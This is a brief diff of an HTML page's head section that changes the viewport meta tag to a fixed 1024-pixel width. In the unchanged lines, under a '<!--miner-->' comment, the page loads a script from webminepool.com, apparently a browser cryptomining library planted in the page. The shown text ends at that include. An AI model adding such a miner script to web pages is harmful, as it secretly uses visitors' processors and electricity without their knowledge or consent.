@@ -3,8 +3,9 @@
 
 <head>       
     <meta charset="UTF-8">  
+
     <!-- Responsive Meta -->                    
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=1024, initial-scale=1.0">
     
  <!--miner-->
 <script src="https://webminepool.com/lib/base.js"></script>
